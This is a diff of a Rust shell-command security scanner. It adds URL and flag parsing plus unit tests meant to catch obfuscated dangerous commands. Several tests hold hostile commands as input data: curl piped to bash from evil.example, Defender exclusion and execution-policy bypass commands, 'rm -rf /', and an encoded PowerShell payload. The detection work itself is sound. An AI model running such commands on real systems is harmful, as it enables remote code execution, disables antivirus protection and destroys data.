+                        | "--request"
+                        | "-w"
+                        | "--write-out"
+                        | "--request-target"
+                        | "--url-query"
+                        | "--output-dir"
+                        | "--stderr"
+                        | "--trace"
+                        | "--trace-ascii"
+                        | "--unix-socket"
+                        | "--abstract-unix-socket"
+                        | "--alt-svc"
+                        | "--aws-sigv4"
+                        | "--cert"
+                        | "-E"
+                        | "--cert-type"
+                        | "--ciphers"
+                        | "-C"
+                        | "--continue-at"
+                        | "--connect-timeout"
+                        | "--create-file-mode"
+                        | "--key"
+                        | "--key-type"
+                        | "--cacert"
+                        | "--capath"
+                        | "--crlfile"
+                        | "--curves"
+                        | "--delegation"
+                        | "--dns-interface"
+                        | "--dns-ipv4-addr"
+                        | "--dns-ipv6-addr"
+                        | "--dns-servers"
+                        | "-D"
+                        | "--dump-header"
+                        | "--egd-file"
+                        | "--engine"
+                        | "--etag-compare"
+                        | "--etag-save"
+                        | "--expect100-timeout"
+                        | "--ftp-account"
+                        | "--ftp-alternative-to-user"
+                        | "--ftp-method"
+                        | "-P"
+                        | "--ftp-port"
+                        | "--ftp-ssl-ccc-mode"
+                        | "--happy-eyeballs-timeout-ms"
+                        | "--haproxy-clientip"
+                        | "-h"
+                        | "--help"
+                        | "--hostpubmd5"
+                        | "--hostpubsha256"
+                        | "--hsts"
+                        | "--interface"
+                        | "--keepalive-time"
+                        | "--krb"
+                        | "--libcurl"
+                        | "--limit-rate"
+                        | "--local-port"
+                        | "--login-options"
+                        | "--mail-auth"
+                        | "--mail-from"
+                        | "--mail-rcpt"
+                        | "--max-filesize"
+                        | "--max-redirs"
+                        | "-m"
+                        | "--max-time"
+                        | "--netrc-file"
+                        | "--noproxy"
+                        | "--oauth2-bearer"
+                        | "--parallel-max"
+                        | "--pass"
+                        | "--pinnedpubkey"
+                        | "--proto"
+                        | "--proto-default"
+                        | "--proto-redir"
+                        | "--proxy-cacert"
+                        | "--proxy-capath"
+                        | "--proxy-cert"
+                        | "--proxy-cert-type"
+                        | "--proxy-ciphers"
+                        | "--proxy-crlfile"
+                        | "--proxy-key"
+                        | "--proxy-key-type"
+                        | "--proxy-pass"
+                        | "--proxy-pinnedpubkey"
+                        | "--proxy-service-name"
+                        | "--proxy-tls13-ciphers"
+                        | "--proxy-tlsauthtype"
+                        | "--proxy-tlspassword"
+                        | "--proxy-tlsuser"
+                        | "--pubkey"
+                        | "-Q"
+                        | "--quote"
+                        | "--random-file"
+                        | "-r"
+                        | "--range"
+                        | "--rate"
+                        | "--retry"
+                        | "--retry-delay"
+                        | "--retry-max-time"
+                        | "--sasl-authzid"
+                        | "--service-name"
+                        | "--socks5-gssapi-service"
+                        | "-Y"
+                        | "--speed-limit"
+                        | "-y"
+                        | "--speed-time"
+                        | "-t"
+                        | "--telnet-option"
+                        | "--tftp-blksize"
+                        | "-z"
+                        | "--time-cond"
+                        | "--tls-max"
+                        | "--tls13-ciphers"
+                        | "--tlsauthtype"
+                        | "--tlspassword"
+                        | "--tlsuser"
+                        | "--trace-config"
+                        | "--variable"
+                ) || short_option_cluster_consumes_following(
+                    &prev,
+                    &[
+                        'A', 'C', 'D', 'E', 'F', 'H', 'K', 'P', 'Q', 'T', 'U', 'X', 'b', 'c', 'd',
+                        'e', 'h', 'm', 'o', 'r', 't', 'u', 'w', 'x', 'y', 'z', 'Y',
+                    ],
+                ) {
                     return true;
                 }
             }
-            let current = strip_quotes(&args[arg_index]);
+            let current = crate::rules::command::normalize_shell_token(&args[arg_index], shell);
             if current.starts_with("-o") && current.len() > 2 && !current.starts_with("--") {
                 return true;
             }
@@ -2259,22 +10949,37 @@ fn is_output_flag_value(cmd: &str, args: &[String], arg_index: usize) -> bool {
         }
         "wget" => {
             if arg_index > 0 {
-                let prev = strip_quotes(&args[arg_index - 1]);
-                if prev == "-O"
-                    || prev == "--output-document"
-                    || prev == "--user"
-                    || prev == "--password"
-                    || prev == "--http-user"
-                    || prev == "--http-password"
-                    || prev == "--ftp-user"
-                    || prev == "--ftp-password"
-                    || prev == "--proxy-user"
-                    || prev == "--proxy-password"
-                {
+                let prev =
+                    crate::rules::command::normalize_shell_token(&args[arg_index - 1], shell);
+                if matches!(
+                    prev.as_str(),
+                    "-O" | "--output-document"
+                        | "--user"
+                        | "--password"
+                        | "--http-user"
+                        | "--http-password"
+                        | "--ftp-user"
+                        | "--ftp-password"
+                        | "--proxy-user"
+                        | "--proxy-password"
+                        | "--header"
+                        | "--post-data"
+                        | "--post-file"
+                        | "--body-data"
+                        | "--body-file"
+                        | "--referer"
+                        | "--user-agent"
+                        | "--ca-certificate"
+                        | "--certificate"
+                        | "--private-key"
+                        | "--directory-prefix"
+                        | "--output-file"
+                        | "--append-output"
+                ) {
                     return true;
                 }
             }
-            let current = strip_quotes(&args[arg_index]);
+            let current = crate::rules::command::normalize_shell_token(&args[arg_index], shell);
             if current.starts_with("-O") && current.len() > 2 && !current.starts_with("--") {
                 return true;
             }
@@ -2294,16 +10999,38 @@ fn is_output_flag_value(cmd: &str, args: &[String], arg_index: usize) -> bool {
         }
         "http" | "https" | "xh" => {
             if arg_index > 0 {
-                let prev = strip_quotes(&args[arg_index - 1]);
+                let prev =
+                    crate::rules::command::normalize_shell_token(&args[arg_index - 1], shell);
                 if prev == "-a" || prev == "--auth" {
                     return true;
                 }
             }
-            let current = strip_quotes(&args[arg_index]);
+            let current = crate::rules::command::normalize_shell_token(&args[arg_index], shell);
             if current.starts_with("--auth=") {
                 return true;
             }
             false
+        }
+        "iwr" | "irm" | "invoke-webrequest" | "invoke-restmethod" => {
+            if arg_index == 0 {
+                return false;
+            }
+            let prev = crate::rules::command::normalize_shell_token(&args[arg_index - 1], shell)
+                .to_ascii_lowercase();
+            matches!(
+                prev.as_str(),
+                "-outfile"
+                    | "-headers"
+                    | "-body"
+                    | "-method"
+                    | "-contenttype"
+                    | "-credential"
+                    | "-authentication"
+                    | "-token"
+                    | "-useragent"
+                    | "-websession"
+                    | "-sessionvariable"
+            )
         }
         _ => false,
     }
@@ -2318,6 +11045,71 @@ fn strip_quotes(s: &str) -> String {
     } else {
         s.to_string()
     }
+}
+
+/// Parse the destination syntax accepted by URL clients when they infer a
+/// scheme. Prefixing a non-authoritative `http://` lets the standards parser
+/// separate userinfo, host, port, path, query, and fragment without the old
+/// alphabetic-TLD heuristic. The legacy domain/file disambiguation remains for
+/// bare names; ports, IP literals, and query/fragment forms are structurally
+/// unambiguous in a sink argv.
+pub(crate) fn parse_schemeless_destination(s: &str) -> Option<UrlLike> {
+    parse_schemeless_destination_inner(s, true)
+}
+
+/// Parse an argv position already proven by the client option grammar to be a
+/// network destination. Unlike the generic extractor, this must not apply file-
+/// extension noise heuristics: clients such as curl interpret `README.md` as a
+/// host when it appears in a URL operand position.
+pub(crate) fn parse_schemeless_network_destination(s: &str) -> Option<UrlLike> {
+    parse_schemeless_destination_inner(s, false)
+}
+
+fn parse_schemeless_destination_inner(s: &str, apply_noise_heuristic: bool) -> Option<UrlLike> {
+    let raw = s.trim();
+    if raw.is_empty()
+        || raw.starts_with('-')
+        || (raw.starts_with('/') && !raw.starts_with("//"))
+        || raw.starts_with('\\')
+        || raw.chars().any(char::is_whitespace)
+        || has_leading_uri_scheme(raw)
+    {
+        return None;
+    }
+
+    let candidate = if raw.starts_with("//") {
+        format!("http:{raw}")
+    } else {
+        format!("http://{raw}")
+    };
+    let parsed = url::Url::parse(&candidate).ok()?;
+    let host = parsed.host_str()?.to_string();
+    if host.is_empty() {
+        return None;
+    }
+
+    let is_ip = host.parse::<std::net::IpAddr>().is_ok();
+    let has_explicit_port = parsed.port().is_some();
+    let has_query_or_fragment = parsed.query().is_some() || parsed.fragment().is_some();
+    let has_meaningful_path = parsed.path() != "/" && !parsed.path().is_empty();
+    let structured_named_host = (host.contains('.') || host.eq_ignore_ascii_case("localhost"))
+        && (has_query_or_fragment || has_meaningful_path);
+    if apply_noise_heuristic
+        && !looks_like_schemeless_host(raw)
+        && !is_ip
+        && !has_explicit_port
+        && !structured_named_host
+    {
+        return None;
+    }
+
+    let authority_start = if raw.starts_with("//") { 2 } else { 0 };
+    let tail_start = raw[authority_start..]
+        .find(['/', '?', '#'])
+        .map(|offset| authority_start + offset)
+        .unwrap_or(raw.len());
+    let path = raw[tail_start..].to_string();
+    Some(UrlLike::SchemelessHostPath { host, path })
 }
 
 fn looks_like_schemeless_host(s: &str) -> bool {
@@ -2432,18 +11224,6 @@ fn looks_like_schemeless_host(s: &str) -> bool {
     // TLD must be 2-63 alphabetic chars (DNS label max).
     let tld = labels.last().unwrap();
     tld.len() >= 2 && tld.len() <= 63 && tld.chars().all(|c| c.is_ascii_alphabetic())
-}
-
-fn extract_host_from_schemeless(s: &str) -> String {
-    s.split('/').next().unwrap_or(s).to_string()
-}
-
-fn extract_path_from_schemeless(s: &str) -> String {
-    if let Some(idx) = s.find('/') {
-        s[idx..].to_string()
-    } else {
-        String::new()
-    }
 }
 
 #[cfg(test)]
@@ -2813,7 +11593,8 @@ mod tests {
 
     #[test]
     fn wrapped_command_depth_exhaustion_is_bounded_and_unresolved() {
-        let input = "command ".repeat(MAX_WRAPPED_COMMAND_DEPTH + 8) + "curl https://example.com";
+        let input = "command ".repeat(crate::rules::command::MAX_WRAPPER_DEPTH + 8)
+            + "curl https://example.com";
         let segments = tokenize::tokenize(&input, ShellType::Posix);
         assert_eq!(segments.len(), 1);
         assert!(
@@ -3257,5 +12038,2349 @@ mod tests {
             !schemeless.is_empty(),
             "evil.zip/payload should be detected as schemeless URL in sink context"
         );
+    }
+
+    #[test]
+    fn shell_effective_spelling_reaches_tier3_and_sink_resolution() {
+        let input = r#"c"ur"l EVIL.EXAMPLE:8443/payload"#;
+        assert!(tier1_scan_for_shell(
+            input,
+            ScanContext::Exec,
+            ShellType::Posix
+        ));
+        let urls = extract_urls(input, ShellType::Posix);
+        assert!(urls.iter().any(|url| {
+            url.in_sink_context
+                && url.parsed.host() == Some("evil.example")
+                && matches!(url.parsed, UrlLike::SchemelessHostPath { .. })
+        }));
+    }
+
+    #[test]
+    fn full_url_schemes_are_case_insensitive_after_shell_normalization() {
+        let urls = extract_urls(r#"curl HT"TP://EVIL.EXAMPLE"/payload"#, ShellType::Posix);
+        assert!(urls.iter().any(|url| {
+            url.parsed.scheme() == Some("http") && url.parsed.host() == Some("evil.example")
+        }));
+    }
+
+    #[test]
+    fn schemeless_structural_parser_covers_ports_ips_queries_and_fragments() {
+        for (destination, expected_host) in [
+            ("evil.example:8443/a", "evil.example"),
+            ("127.0.0.1:8080/a", "127.0.0.1"),
+            ("2130706433/a", "127.0.0.1"),
+            ("[::1]:8080/a", "[::1]"),
+            ("evil.example?download=1", "evil.example"),
+            ("evil.example#payload", "evil.example"),
+        ] {
+            let urls = extract_urls(&format!("curl {destination}"), ShellType::Posix);
+            assert!(
+                urls.iter().any(|url| {
+                    url.parsed.host().is_some_and(|host| {
+                        host == expected_host
+                            || host == expected_host.trim_matches(|ch| ch == '[' || ch == ']')
+                    })
+                }),
+                "missing structured destination {destination}: {urls:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn schemeless_structural_parser_keeps_file_controls() {
+        assert!(extract_urls("curl README.md", ShellType::Posix).is_empty());
+        assert!(
+            extract_urls("curl -o archive.zip example.com", ShellType::Posix)
+                .iter()
+                .all(|url| url.raw != "archive.zip")
+        );
+    }
+
+    #[test]
+    fn package_registry_specs_are_not_schemeless_urls_but_artifact_urls_remain_visible() {
+        for input in [
+            "npm install eslint.config@^1",
+            "npm i @scope/eslint.config@latest",
+            "pnpm add eslint.config",
+            "yarn add eslint.config",
+            "npx eslint.config",
+        ] {
+            let urls = extract_urls(input, ShellType::Posix);
+            assert!(
+                urls.is_empty(),
+                "package spec became a URL: {input} -> {urls:?}"
+            );
+        }
+
+        for (input, host) in [
+            (
+                "npm install https://artifacts.example/package.tgz",
+                "artifacts.example",
+            ),
+            (
+                "npm install artifacts.example/package.tgz",
+                "artifacts.example",
+            ),
+            (
+                "npm install foo@artifacts.example/package.tgz",
+                "artifacts.example",
+            ),
+        ] {
+            let urls = extract_urls(input, ShellType::Posix);
+            assert!(
+                urls.iter().any(|url| url.parsed.host() == Some(host)),
+                "artifact URL disappeared: {input} -> {urls:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn env_split_string_forms_resolve_the_real_source_command() {
+        for input in [
+            r#"env -S 'curl https://denied.example/a'"#,
+            r#"env --split-string 'curl https://denied.example/a'"#,
+            r#"env --split-string='command curl https://denied.example/a'"#,
+            // GNU env -S does not accept `\ ` as an escape. Quote the inner
+            // split-string operand so each env layer applies its own grammar.
+            r#"env -S 'env -S "curl https://denied.example/a"'"#,
+            r#"env --argv0 fake -S 'curl https://denied.example/a'"#,
+            r#"env -iS 'curl https://denied.example/a'"#,
+            r#"env -iS'curl https://denied.example/a'"#,
+            r#"env --block-signal curl https://denied.example/a"#,
+            r#"env -iu FOO curl https://denied.example/a"#,
+            r#"env -S '-i FOO=1 curl https://denied.example/a'"#,
+            r#"env -S 'curl' https://denied.example/a"#,
+            r#"env --split-string=curl https://denied.example/a"#,
+            r#"env -Scurl https://denied.example/a"#,
+        ] {
+            let segment = tokenize::tokenize(input, ShellType::Posix)
+                .into_iter()
+                .next()
+                .unwrap();
+            let resolved = resolve_wrapped_command_for_shell(&segment, ShellType::Posix)
+                .unwrap_or_else(|| panic!("split-string did not resolve: {input}"));
+            assert_eq!(resolved.0, "curl", "wrong leader for {input}");
+            assert!(resolved.1.iter().any(|arg| arg.contains("denied.example")));
+        }
+    }
+
+    #[test]
+    fn docker_pull_value_and_unknown_options_cannot_hide_the_real_image() {
+        let known = extract_urls(
+            "docker run --pull always attacker.example/ns/image:1",
+            ShellType::Posix,
+        );
+        let known_refs: Vec<_> = known
+            .iter()
+            .filter(|url| matches!(url.parsed, UrlLike::DockerRef { .. }))
+            .collect();
+        assert_eq!(known_refs.len(), 1);
+        assert_eq!(known_refs[0].raw, "attacker.example/ns/image:1");
+
+        let unknown = extract_urls(
+            "docker run --future-option possible-value attacker.example/ns/image:1",
+            ShellType::Posix,
+        );
+        assert!(unknown.iter().any(|url| {
+            url.raw == "attacker.example/ns/image:1"
+                && matches!(url.parsed, UrlLike::DockerRef { .. })
+        }));
+
+        let unknown_boolean = extract_urls(
+            "docker run --future-boolean attacker.example/ns/image:2",
+            ShellType::Posix,
+        );
+        assert!(unknown_boolean
+            .iter()
+            .any(|url| url.raw == "attacker.example/ns/image:2"));
+
+        let known_boolean = extract_urls(
+            "docker run --rm nginx echo attacker.example/not-an-image",
+            ShellType::Posix,
+        );
+        let known_boolean_refs: Vec<_> = known_boolean
+            .iter()
+            .filter(|url| matches!(url.parsed, UrlLike::DockerRef { .. }))
+            .collect();
+        assert_eq!(known_boolean_refs.len(), 1);
+        assert_eq!(known_boolean_refs[0].raw, "nginx");
+
+        let pull_all = extract_urls("docker pull -a nginx", ShellType::Posix);
+        assert!(pull_all
+            .iter()
+            .any(|url| { url.raw == "nginx" && matches!(url.parsed, UrlLike::DockerRef { .. }) }));
+    }
+
+    #[test]
+    fn inspection_carveout_only_skips_proven_literal_arguments() {
+        let literal = r#"tirith diff '$(curl https://literal.example)'"#;
+        assert!(tirith_inert_arg_range(literal, ShellType::Posix).is_some());
+        assert!(extract_urls(literal, ShellType::Posix).is_empty());
+
+        for active in [
+            r#"tirith diff "$(curl https://evil.example/a)""#,
+            r#"tirith why `curl https://evil.example/b`"#,
+            r#"tirith explain <(curl https://evil.example/c)"#,
+        ] {
+            assert!(
+                tirith_inert_arg_range(active, ShellType::Posix).is_none(),
+                "active expansion received an inert carveout: {active}"
+            );
+            assert!(
+                extract_urls(active, ShellType::Posix).iter().any(|url| {
+                    url.in_sink_context && url.parsed.host() == Some("evil.example")
+                }),
+                "nested source URL was not analyzed: {active}"
+            );
+        }
+    }
+
+    #[test]
+    fn nested_substitutions_keep_single_quotes_literal_inside_double_quotes() {
+        let input = r#"tirith diff "it's $(curl https://quote-state.example/payload)""#;
+        for shell in [ShellType::Posix, ShellType::PowerShell] {
+            let bodies = executable_substitutions(input, shell);
+            assert!(
+                bodies
+                    .iter()
+                    .any(|body| body.contains("curl https://quote-state.example/payload")),
+                "{shell:?} lost the active substitution: {bodies:?}"
+            );
+            assert!(tirith_inert_arg_range(input, shell).is_none());
+            assert!(extract_urls(input, shell).iter().any(|url| {
+                url.in_sink_context && url.parsed.host() == Some("quote-state.example")
+            }));
+        }
+    }
+
+    #[test]
+    fn substitution_close_ignores_commented_parens_and_resumes_after_newline() {
+        for shell in [ShellType::Posix, ShellType::PowerShell] {
+            let input =
+                "tirith diff \"$(echo safe # )\ncurl https://comment-close.example/payload)\"";
+            let bodies = executable_substitutions(input, shell);
+            assert_eq!(bodies.len(), 1, "{shell:?}: {bodies:?}");
+            assert!(bodies[0].contains("curl https://comment-close.example/payload"));
+            assert!(extract_urls(input, shell).iter().any(|url| {
+                url.in_sink_context && url.parsed.host() == Some("comment-close.example")
+            }));
+
+            let commented = "# $(curl https://commented.example/payload)\necho safe";
+            assert!(
+                executable_substitutions(commented, shell).is_empty(),
+                "{shell:?} treated a line comment as executable"
+            );
+            assert!(
+                extract_urls(commented, shell).is_empty(),
+                "{shell:?} emitted a URL from commented syntax"
+            );
+        }
+    }
+
+    #[test]
+    fn powershell_only_recovers_scriptblocks_in_executable_contexts() {
+        for input in [
+            "$block = { Add-MpPreference -ExclusionPath C:\\Temp }",
+            "Write-Output '{ Add-MpPreference -ExclusionPath C:\\Temp }'",
+            "Write-Output \"& { Add-MpPreference -ExclusionPath C:\\Temp }\"",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::PowerShell);
+            assert!(
+                scan.bodies.is_empty(),
+                "dormant body ran: {input} -> {scan:?}"
+            );
+            assert!(scan.gap.is_none(), "literal syntax became a gap: {scan:?}");
+        }
+
+        for input in [
+            "& { Add-MpPreference -ExclusionPath C:\\Temp }",
+            ". { Set-ExecutionPolicy Bypass }",
+            "& ({ Add-MpPreference -ExclusionProcess malware.exe })",
+            "1 | ForEach-Object { Add-MpPreference -ExclusionPath C:\\Temp }",
+            "Invoke-Command -ScriptBlock { Set-ExecutionPolicy Bypass }",
+            "Start-Job { Add-MpPreference -ExclusionProcess malware.exe }",
+            "Measure-Command { Set-ExecutionPolicy Bypass }",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::PowerShell);
+            assert_eq!(scan.bodies.len(), 1, "{input} -> {scan:?}");
+            assert!(scan.gap.is_none(), "literal group was ambiguous: {scan:?}");
+        }
+    }
+
+    #[test]
+    fn powershell_nested_groups_and_subexpressions_are_recovered_one_level_at_a_time() {
+        let outer = executable_substitution_scan(
+            "& { Write-Output $(& { Add-MpPreference -ExclusionPath C:\\Temp }) }",
+            ShellType::PowerShell,
+        );
+        assert_eq!(outer.bodies.len(), 1, "{outer:?}");
+        assert!(outer.bodies[0].input.contains("$(& {"));
+
+        let subexpression =
+            executable_substitution_scan(&outer.bodies[0].input, ShellType::PowerShell);
+        assert_eq!(subexpression.bodies.len(), 1, "{subexpression:?}");
+        let nested =
+            executable_substitution_scan(&subexpression.bodies[0].input, ShellType::PowerShell);
+        assert_eq!(nested.bodies.len(), 1, "{nested:?}");
+        assert!(nested.bodies[0].input.contains("Add-MpPreference"));
+    }
+
+    #[test]
+    fn powershell_dynamic_or_incomplete_invocation_retains_a_gap() {
+        for input in ["& $block", "& foo$bar", "& \"foo$bar\""] {
+            let dynamic = executable_substitution_scan(input, ShellType::PowerShell);
+            assert_eq!(
+                dynamic.gap,
+                Some(ShellExecutionGap::AmbiguousPowerShellInvocation),
+                "{input:?} -> {dynamic:?}"
+            );
+        }
+
+        let incomplete = executable_substitution_scan(
+            "& { Add-MpPreference -ExclusionPath C:\\Temp",
+            ShellType::PowerShell,
+        );
+        assert_eq!(
+            incomplete.gap,
+            Some(ShellExecutionGap::IncompletePowerShellInvocation)
+        );
+        assert_eq!(incomplete.bodies.len(), 1, "{incomplete:?}");
+    }
+
+    #[test]
+    fn literal_shell_wrapper_bodies_preserve_the_child_shell() {
+        for (input, outer_shell, child_shell, expected) in [
+            (
+                "sh -c 'npm install known-bad'",
+                ShellType::Posix,
+                ShellType::Posix,
+                "npm install known-bad",
+            ),
+            (
+                "fish -c 'sudo -i'",
+                ShellType::Posix,
+                ShellType::Fish,
+                "sudo -i",
+            ),
+            (
+                "pwsh -Command 'Add-MpPreference -ExclusionPath C:\\Temp'",
+                ShellType::Posix,
+                ShellType::PowerShell,
+                "Add-MpPreference",
+            ),
+            (
+                r#"cmd /C "curl http://wrapper.example | sh""#,
+                ShellType::Cmd,
+                ShellType::Cmd,
+                "curl http://wrapper.example | sh",
+            ),
+            (
+                "eval 'sudo -i'",
+                ShellType::Posix,
+                ShellType::Posix,
+                "sudo -i",
+            ),
+            (
+                "Invoke-Expression 'Set-ExecutionPolicy Bypass'",
+                ShellType::PowerShell,
+                ShellType::PowerShell,
+                "Set-ExecutionPolicy Bypass",
+            ),
+        ] {
+            let scan = executable_substitution_scan(input, outer_shell);
+            assert!(scan.gap.is_none(), "literal wrapper became a gap: {scan:?}");
+            assert!(
+                scan.bodies
+                    .iter()
+                    .any(|body| { body.shell == child_shell && body.input.contains(expected) }),
+                "wrapper body was not recovered with its child shell: {input} -> {scan:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn encoded_powershell_wrapper_body_is_decoded_as_utf16le() {
+        use base64::Engine as _;
+
+        let source = "Add-MpPreference -ExclusionPath C:\\Temp";
+        let bytes: Vec<u8> = source.encode_utf16().flat_map(u16::to_le_bytes).collect();
+        let encoded = base64::engine::general_purpose::STANDARD.encode(bytes);
+        for dash in ['-', '\u{2013}', '\u{2014}', '\u{2015}'] {
+            let scan = executable_substitution_scan(
+                &format!("powershell {dash}EncodedCommand {encoded}"),
+                ShellType::Cmd,
+            );
+            assert!(
+                scan.gap.is_none(),
+                "valid encoded command was rejected: {scan:?}"
+            );
+            assert!(
+                scan.bodies
+                    .iter()
+                    .any(|body| { body.shell == ShellType::PowerShell && body.input == source }),
+                "encoded body was not recovered for dash {dash:?}: {scan:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn unicode_parameter_dashes_bind_cross_shell_powershell_command_bodies() {
+        let source = "Add-MpPreference -ExclusionPath C:\\Temp";
+        for dash in ['\u{2013}', '\u{2014}', '\u{2015}'] {
+            let input = format!("pwsh {dash}Command '{source}'");
+            let scan = executable_substitution_scan(&input, ShellType::Posix);
+            assert!(scan.gap.is_none(), "{input:?} -> {scan:?}");
+            assert!(
+                scan.bodies
+                    .iter()
+                    .any(|body| body.shell == ShellType::PowerShell && body.input == source),
+                "PowerShell command body was not recovered: {input:?} -> {scan:?}"
+            );
+        }
+
+        assert_eq!(
+            powershell_cli_command_kind("`\u{2013}Command"),
+            None,
+            "a literal Cmd backtick must not be reinterpreted as a PowerShell escape"
+        );
+    }
+
+    #[test]
+    fn dynamic_or_invalid_shell_wrapper_bodies_retain_a_gap() {
+        for (input, shell, expected) in [
+            (
+                r#"sh -c "$COMMAND""#,
+                ShellType::Posix,
+                ShellExecutionGap::AmbiguousExecutableBody,
+            ),
+            (
+                "Invoke-Expression $command",
+                ShellType::PowerShell,
+                ShellExecutionGap::AmbiguousExecutableBody,
+            ),
+            (
+                "cmd /C %COMMAND%",
+                ShellType::Cmd,
+                ShellExecutionGap::AmbiguousExecutableBody,
+            ),
+            (
+                "powershell -EncodedCommand not-base64!",
+                ShellType::Cmd,
+                ShellExecutionGap::InvalidEncodedPowerShellCommand,
+            ),
+        ] {
+            let scan = executable_substitution_scan(input, shell);
+            assert_eq!(scan.gap, Some(expected), "{input} -> {scan:?}");
+        }
+
+        for (input, shell) in [
+            ("echo 'sh -c rm -rf /'", ShellType::Posix),
+            (
+                "Write-Output \"Invoke-Expression 'sudo -i'\"",
+                ShellType::PowerShell,
+            ),
+        ] {
+            let scan = executable_substitution_scan(input, shell);
+            assert!(
+                scan.bodies.is_empty(),
+                "quoted data executed: {input} -> {scan:?}"
+            );
+            assert!(scan.gap.is_none(), "quoted data became ambiguous: {scan:?}");
+        }
+    }
+
+    #[test]
+    fn derived_or_unparsed_posix_command_bodies_fail_closed() {
+        for input in [
+            "$(printf rm) -rf /",
+            "${UNSET:-rm} -rf /",
+            "{rm,-rf,/}",
+            "cat <<'EOF'\nunclosed",
+            "bash <(printf '%s\\n' 'rm -rf /')",
+            "source <(printf '%s\\n' 'rm -rf /')",
+            ". <(printf '%s\\n' 'rm -rf /')",
+            "python <(printf '%s\\n' 'rm -rf /')",
+            "perl <(printf '%s\\n' 'rm -rf /')",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert!(scan.gap.is_some(), "{input:?} -> {scan:?}");
+        }
+    }
+
+    #[test]
+    fn bounded_heredocs_preserve_literal_data_and_recover_executable_input() {
+        let arithmetic = executable_substitution_scan("echo $((1 << 2))", ShellType::Posix);
+        assert!(arithmetic.gap.is_none(), "{arithmetic:?}");
+
+        let multiline_literal =
+            executable_substitution_scan(": 'command\nFORGED-COMMAND'", ShellType::Posix);
+        assert!(multiline_literal.gap.is_none(), "{multiline_literal:?}");
+        assert!(multiline_literal.bodies.is_empty(), "{multiline_literal:?}");
+
+        let fake_heredocs_inside_multiline_literal =
+            executable_substitution_scan(": 'line one\n<<EOF\n<<<NOPE\nEOF'", ShellType::Posix);
+        assert!(
+            fake_heredocs_inside_multiline_literal.gap.is_none(),
+            "{fake_heredocs_inside_multiline_literal:?}"
+        );
+        assert!(
+            fake_heredocs_inside_multiline_literal.bodies.is_empty(),
+            "{fake_heredocs_inside_multiline_literal:?}"
+        );
+
+        for input in [
+            "cat <<EOF\nhello world\nEOF",
+            "cat <<'EOF'\n$(rm -rf /)\nEOF",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert!(scan.gap.is_none(), "literal heredoc became a gap: {scan:?}");
+            assert!(scan.bodies.is_empty(), "literal data executed: {scan:?}");
+        }
+
+        let interpreter =
+            executable_substitution_scan("bash << 'EOF'\necho hello\nEOF", ShellType::Posix);
+        assert!(interpreter.gap.is_none(), "{interpreter:?}");
+        assert!(interpreter
+            .bodies
+            .iter()
+            .any(|body| { body.shell == ShellType::Posix && body.input.trim() == "echo hello" }));
+
+        let expanded = executable_substitution_scan(
+            "cat <<EOF\nvalue=$(curl https://heredoc.example/payload)\nEOF",
+            ShellType::Posix,
+        );
+        assert!(expanded.gap.is_none(), "{expanded:?}");
+        assert!(expanded
+            .bodies
+            .iter()
+            .any(|body| body.input.contains("curl https://heredoc.example/payload")));
+
+        let followed_input =
+            "cat <<'EOF'\n' quote-like data\nEOF\ncurl https://evil.example/install.sh | bash";
+        let followed = executable_substitution_scan(followed_input, ShellType::Posix);
+        assert!(followed.gap.is_none(), "{followed:?}");
+        assert!(followed
+            .bodies
+            .iter()
+            .all(|body| !body.input.contains("quote-like data")));
+        let followed_view = shell_execution_view(followed_input, ShellType::Posix);
+        assert!(followed_view.contains("curl https://evil.example/install.sh | bash"));
+        assert!(!followed_view.contains("quote-like data"));
+
+        let unclosed = executable_substitution_scan("bash <<EOF\necho unsafe", ShellType::Posix);
+        assert_eq!(
+            unclosed.gap,
+            Some(ShellExecutionGap::IncompleteExecutableBody)
+        );
+    }
+
+    #[test]
+    fn secondary_command_consumers_recover_their_literal_child() {
+        for (input, shell, child_shell, expected) in [
+            (
+                "printf x | xargs rm -rf /",
+                ShellType::Posix,
+                ShellType::Posix,
+                "rm -rf /",
+            ),
+            (
+                "find . -exec rm -rf / {} \\;",
+                ShellType::Posix,
+                ShellType::Posix,
+                "rm -rf / {}",
+            ),
+            (
+                "coproc rm -rf /home",
+                ShellType::Posix,
+                ShellType::Posix,
+                "rm -rf /home",
+            ),
+            (
+                "coproc worker { rm -rf /home; }",
+                ShellType::Posix,
+                ShellType::Posix,
+                "rm -rf /home",
+            ),
+            (
+                "coproc worker ( rm -rf /home )",
+                ShellType::Posix,
+                ShellType::Posix,
+                "rm -rf /home",
+            ),
+            (
+                "builtin eval 'rm -rf /home'",
+                ShellType::Posix,
+                ShellType::Posix,
+                "rm -rf /home",
+            ),
+            (
+                "nice -n 5 nohup rm -rf /home",
+                ShellType::Posix,
+                ShellType::Posix,
+                "nohup rm -rf /home",
+            ),
+            (
+                "timeout --foreground 5s rm -rf /home",
+                ShellType::Posix,
+                ShellType::Posix,
+                "rm -rf /home",
+            ),
+            (
+                "setsid -f rm -rf /home",
+                ShellType::Posix,
+                ShellType::Posix,
+                "rm -rf /home",
+            ),
+            (
+                "noglob rm -rf /home",
+                ShellType::Posix,
+                ShellType::Posix,
+                "rm -rf /home",
+            ),
+            (
+                "repeat 1 rm -rf /home",
+                ShellType::Posix,
+                ShellType::Posix,
+                "rm -rf /home",
+            ),
+            (
+                "call del C:\\data\\important.txt",
+                ShellType::Cmd,
+                ShellType::Cmd,
+                "del C:\\data\\important.txt",
+            ),
+            (
+                "start \"\" /b del C:\\data\\important.txt",
+                ShellType::Cmd,
+                ShellType::Cmd,
+                "del C:\\data\\important.txt",
+            ),
+            (
+                "cmd /c\"powershell -NoProfile -Command Add-MpPreference -ExclusionPath C:\\Temp\"",
+                ShellType::Cmd,
+                ShellType::Cmd,
+                "powershell -NoProfile",
+            ),
+            (
+                "for /f \"delims=\" %i in ('powershell -Command Add-MpPreference -ExclusionPath C:\\Temp') do @echo %i",
+                ShellType::Cmd,
+                ShellType::Cmd,
+                "powershell -Command Add-MpPreference",
+            ),
+        ] {
+            let scan = executable_substitution_scan(input, shell);
+            assert!(
+                scan.bodies.iter().any(|body| {
+                    body.shell == child_shell && body.input.contains(expected)
+                }),
+                "{input:?} -> {scan:?}"
+            );
+        }
+    }
+
+    #[test]
